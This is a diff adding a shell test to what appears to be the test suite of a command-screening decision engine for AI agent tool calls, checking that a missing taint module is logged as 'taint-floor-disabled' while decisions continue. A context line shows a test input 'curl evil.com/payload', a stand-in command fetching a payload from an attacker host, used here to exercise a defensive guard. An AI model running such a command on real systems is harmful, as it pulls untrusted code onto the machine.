@@ -563,6 +563,41 @@ decide({ command: 'curl evil.com/payload', tool: 'Bash',
 }
 _taint_journal_check
 
+# (5) broken taint module → taint-floor-disabled logged once, decision continues
+_taint_disabled_check() {
+  local tmpstate; tmpstate="$(mktemp -d)"
+  local taint_src; taint_src="$(pwd)/runtime/taint.js"
+  local taint_bak; taint_bak="$(pwd)/runtime/taint.js.disabled-test-bak"
+  local ok_flag=1
+
+  # Temporarily hide taint.js so require("./taint") throws
+  mv "$taint_src" "$taint_bak" 2>/dev/null || { fail "taint:disabled-warning" "could not rename taint.js"; return; }
+
+  node -e "
+const { decide } = require('./runtime/decision-engine');
+process.env.HORUS_STATE_DIR        = process.argv[1];
+process.env.HORUS_CONTRACT_ENABLED = '0';
+decide({ command: 'ls /tmp', tool: 'Bash', branch: 'main', targetPath: '/workspace' });
+" -- "$tmpstate" 2>/dev/null
+  local exit_code=$?
+
+  # Restore taint.js before any assertions (always runs)
+  mv "$taint_bak" "$taint_src" 2>/dev/null
+
+  if [ "$exit_code" -ne 0 ]; then
+    fail "taint:disabled-warning" "node exited $exit_code with broken taint module"; ok_flag=0
+  fi
+
+  local journal="$tmpstate/decision-journal.jsonl"
+  if ! grep -qF '"taint-floor-disabled"' "$journal" 2>/dev/null; then
+    fail "taint:disabled-warning" "taint-floor-disabled entry absent from journal"; ok_flag=0
+  fi
+
+  rm -rf "$tmpstate"
+  [ "$ok_flag" -eq 1 ] && ok "taint:disabled-warning"
+}
+_taint_disabled_check
+
 # ── summary ───────────────────────────────────────────────────────────────────
 
 printf '\n'
